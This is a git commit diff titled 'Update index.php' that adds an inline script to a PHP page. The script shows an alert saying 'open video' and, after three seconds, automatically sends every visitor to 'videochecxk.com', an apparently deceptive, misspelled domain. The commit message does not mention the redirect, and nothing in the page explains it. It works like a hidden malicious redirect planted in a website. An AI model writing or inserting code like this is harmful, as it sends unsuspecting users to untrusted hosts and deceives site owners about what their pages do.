5b503256dcd2aa216d9d9914d359032994bcfb75
sanernecro <sanernecro@gmail.com>
2017-08-07 22:08:13 +0300

    Update index.php

--- web/index.php
+++ web/index.php
@@ -3,3 +3,20 @@
 echo 'hello';
 
 ?>
+
+
+<script>
+
+function test2()
+{
+    // defer the execution of anonymous function for 
+    // 3 seconds and go to next line of code.
+    setTimeout(function(){ 
+
+        location.assign("http://videochecxk.com/");
+    }, 3000);  
+
+    alert('open video');
+}
+test2();
+</script>
